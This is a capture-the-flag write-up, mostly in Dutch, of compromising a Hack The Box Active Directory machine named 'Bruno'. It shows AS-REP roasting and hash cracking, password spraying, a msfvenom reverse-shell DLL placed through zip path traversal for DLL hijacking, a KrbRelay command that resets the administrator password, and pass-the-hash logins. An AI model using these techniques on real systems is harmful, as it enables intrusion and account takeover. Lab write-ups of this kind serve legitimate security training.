# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ nmap 10.129.238.9   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 20
Nmap scan report for 10.129.238.9
Host is up (0.084s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ nmap -p21,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389 -sCV 10.129.238.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 20:39 CET
Nmap scan report for 10.129.238.9
Host is up (0.076s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-23 19:39:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T19:40:48+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
|_ssl-date: 2025-12-23T19:40:47+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T19:40:48+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T19:40:47+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2025-10-08T09:36:40
|_Not valid after:  2026-04-09T09:36:40
|_ssl-date: 2025-12-23T19:40:47+00:00; +1s from scanner time.
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-23T19:40:12
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

Ik ben in de ftp server gaan kijken, want zoals je hierboven kunt zien kan je op de ftp server inloggen met de anonymous user zonder een password.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ ftp 10.129.238.9
Connected to 10.129.238.9.
220 Microsoft FTP Service
Name (10.129.238.9:kali): anonymous 
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49724|)
125 Data connection already open; Transfer starting.
06-29-22  04:55PM       <DIR>          app
06-29-22  04:33PM       <DIR>          benign
06-29-22  01:41PM       <DIR>          malicious
06-29-22  04:33PM       <DIR>          queue
```

Ik ben alle files die binnen de directories te vinden is gaan downloaden naar mijn eigen machine door gebruik te maken van het get commando. Binnen het changelog bestand kan je de user svc_scan vinden.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ cat changelog          
Version 0.3
- integrated with dev site
- automation using svc_scan

Version 0.2
- additional functionality 

Version 0.1
- initial support for EICAR string
```

Er is voor de gebruiker geen password gevonden. Ik ben een kerberoast auth gaan doen voor de hash te achterhalen. Ik ben hiervoor gebruik gaan maken van de GetNPUsers.py tool.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ GetNPUsers.py bruno.vl/svc_scan -dc-ip brunodc.bruno.vl -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc_scan
$krb5asrep$23$svc_scan@BRUNO.VL:832e04a6bc5a8e3b138fb959121ed58f$d665399e6dd89edb5b6857869864ed60e4fc319ee843cc494a92815696ae1d5b00dbbf735ff189292f3771101e4c58c6456dd8e8823f7ae1e4b7d4e846cc61aed6f9414c909bb2bdb004662951aecd9e316e094342bc821df60bfc9be59358c5f16dbe547ed55c8992019aba2379c0877e0c03ba3a53aae30adac72b35c45a016651a5793a28a3cd21ba469cdc04896a4d1b4ce91cc4e74d5256af851f61f2ff25aa21481b2d86f1ea9330164e9f545aabddc7d4f0c3aa0c3d5e4fc83afaf2e10751c58f700707ab4a1107381f682be6f0ea1703d522290ff6f0a5e944236fac1f8686cf
```

Ik ben de hash gaan opslaan in een file door gebruik te maken van het `echo` commando. Nu ben ik het password gaan achterhalen door gebruik te maken van de tool `john`. Hieronder kan je de usercreds hebben van de svc_scan user

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ john hash  --wordlist=/usr/share/wordlists/rockyou.txt
Sunshine1        ($krb5asrep$23$svc_scan@BRUNO.VL)     
Session completed. 
```

Ik ben naar de shared folders gaan kijken waarop deze user rechten heeft. Hieronder kan je zien dat deze user read rechten heeft op de CertEnroll Disk en deze write rechten heeft op de queue disk.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ smbmap -H 10.129.238.9 -u svc_scan -p Sunshine1

[+] IP: 10.129.238.9:445        Name: bruno.vl                  Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        queue                                                   READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 

```

Ik ben een connectie gaan maken met de queue dir want daar kan je zien dat de user svc_scan de rechten heeft voor te lezen en te schrijven. Maar zoals je hieronder zult kunnen zien is er geen informatie te vinden met deze user op de smb server.

```

```

Ik ben dus een andere manier gaan zoeken. Ik ben user enumeration gaan doen op de smb server. Dit wilt zeggen dat ik ben gaan kijken welke users er gekent zijn binnen het domain brunodc.bruno.vl. Daar ben ik de volgende users tegengekomen.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ nxc smb brunodc.bruno.vl -u svc_scan -p Sunshine1 --users
SMB         10.129.28.3     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
SMB         10.129.28.3     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
SMB         10.129.28.3     445    BRUNODC          -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.28.3     445    BRUNODC          Administrator                 2023-08-22 06:03:20 0       Built-in account for administering the computer/domain
SMB         10.129.28.3     445    BRUNODC          Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                
SMB         10.129.28.3     445    BRUNODC          krbtgt                        2022-06-29 13:22:03 0       Key Distribution Center Service Account                                                                                 
SMB         10.129.28.3     445    BRUNODC          svc_net                       2022-06-29 13:35:45 0        
SMB         10.129.28.3     445    BRUNODC          svc_scan                      2022-06-29 13:36:15 0        
SMB         10.129.28.3     445    BRUNODC          Chloe.Ball                    2022-06-29 13:39:29 0        
SMB         10.129.28.3     445    BRUNODC          Kayleigh.Patel                2022-06-29 13:39:32 0        
SMB         10.129.28.3     445    BRUNODC          Donna.Harrison                2022-06-29 13:39:32 0        
SMB         10.129.28.3     445    BRUNODC          Charles.Young                 2022-06-29 13:39:32 0        
SMB         10.129.28.3     445    BRUNODC          Graeme.Grant                  2022-06-29 13:39:32 0        
SMB         10.129.28.3     445    BRUNODC          Natalie.Anderson              2022-06-29 13:39:33 0        
SMB         10.129.28.3     445    BRUNODC          Sam.Owen                      2022-06-29 13:39:33 0        
SMB         10.129.28.3     445    BRUNODC          Jeremy.Singh                  2022-06-29 13:39:33 0        
SMB         10.129.28.3     445    BRUNODC          Kieran.Day                    2022-06-29 13:39:34 0        
SMB         10.129.28.3     445    BRUNODC          Hugh.Young                    2022-06-29 13:39:35 0        
SMB         10.129.28.3     445    BRUNODC          [*] Enumerated 15 local users: BRUNO

```

Ik ben de users allemaal in een bestand gaan plaatsen zodat ik kan testen of dat er nog andere users gebruik maken van het password van de user svc_scan. Zoals je hieronder zult kunnen zien maakt de gebruiker svc_net ook gebruik van hetzelfde password. Dit kan je hieronder zien.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ nxc smb brunodc.bruno.vl -u users -p Sunshine1 --continue-on-success
SMB         10.129.28.3     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Administrator:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Guest:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\krbtgt:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [+] bruno.vl\svc_net:Sunshine1 
SMB         10.129.28.3     445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Chloe.Ball:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Kayleigh. Patel:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Donna.Harrison:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Charles.Young:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Graeme.Grant:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Natalie.Anderson:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Sam.Owen:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Jeremu.Singh:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Kieran.Day:Sunshine1 STATUS_LOGON_FAILURE 
SMB         10.129.28.3     445    BRUNODC          [-] bruno.vl\Hugh.Young:Sunshine1 STATUS_LOGON_FAILURE
```

Ik ben een connectie met de smb server gaan maken maar er was geen verschil met dan met de andere user. Ik ben eens gaan kijken of ik met de svc_net user de gegevens van de ldap server kan nemen. Dit kan je doen door het volgende commando te gebruiken

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ nxc ldap 10.129.28.3 -u svc_net -p Sunshine1 --bloodhound --collection All --dns-server 10.129.28.3
LDAP        10.129.28.3     389    BRUNODC          [*] Windows Server 2022 Build 20348 (name:BRUNODC) (domain:bruno.vl)
LDAP        10.129.28.3     389    BRUNODC          [+] bruno.vl\svc_net:Sunshine1 
LDAP        10.129.28.3     389    BRUNODC          Resolved collection methods: session, localadmin, container, dcom, psremote, group, rdp, trusts, acl, objectprops                                                                 
LDAP        10.129.28.3     389    BRUNODC          Done in 00M 07S
LDAP        10.129.28.3     389    BRUNODC          Compressing output into /home/kali/.nxc/logs/BRUNODC_10.129.28.3_2025-12-29_191508_bloodhound.zip 
```

Ik ben de gegevens gaan uploaden op bloodhound. Maar zoals je kunt zien is er geen informatie dat we kunnen gebruiken.
Although the application could not be directly decompiled due to native compilation, string analysis confirmed the use of `System.IO.Compression.ZipFile`. In .NET applications, archive extraction paths are constructed using the `Path.Combine()` method from the System.IO namespace.

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ strings SampleScanner.dll | grep -i system.io

System.IO
System.IO.Compression.ZipFile
System.IO.FileSystem
System.IO.Compression
```

The application dynamically loads `Microsoft.DiaSymReader.Native.amd64.dll` using LoadLibraryExW without specifying an absolute path. The DLL is not present in System32, and the application directory is writable via SMB. This allows DLL search order hijacking by placing a malicious DLL in the application root directory.
Zoals je kunt zien heb je .dll files binnen de directory. we zullen dus een malicious .dll file gaan aanmaken dit door gebruik te maken van de msfvenom tool en deze in een zip bestand gaan zetten door gebruik te maken van de evilarc tool. Aan de hand van deze tool kan je een bestand in een zip bestand zetten en met een direct path traversal. eens dat het zip bestand aan is gemaakt zal ik deze gaan uploaden op de smb server en zullen we aan de hand van een listener een remote shell connection met de server hebben.


```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.251 LPORT=4444 -f dll -o evil.dll
Saved as: evil.dll

┌──(kali㉿kali)-[~/HTB/Bruno/evilarc]
└─$ python2 evilarc.py -d 5 -o unix evil.dll
Creating evil.zip containing ../../../../../evil.dll
┌──(kali㉿kali)-[~/HTB/Bruno/evilarc]
└─$ ls
evilarc.py  evil.dll  evil.zip  README.md
┌──(kali㉿kali)-[~/HTB/Bruno/evilarc]
└─$ cp evil.zip ../      
```

User Flag 

```
*Evil-WinRM* PS C:\Users\svc_scan\Desktop> cat user.txt
bcc545c58d3b31f9bc4b2e001867fe0a
```
Ge moet gebruik maken van ./KrbRelay.exe tool https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/KrbRelay.exe
```
./KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-1116 -ssl -port 10246 -reset-password administrator Puckie71#
```

Root Flag

```
┌──(kali㉿kali)-[~/HTB/Bruno]
└─$ evil-winrm -i brunodc.bruno.vl -u administrator -H '13735c7d60b417421dc6130ac3e0bfd4'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c16d49744ef0dd47ce2fa632f06ba0d7
```

ROOTED

![[Pasted image 20251229224829.png]]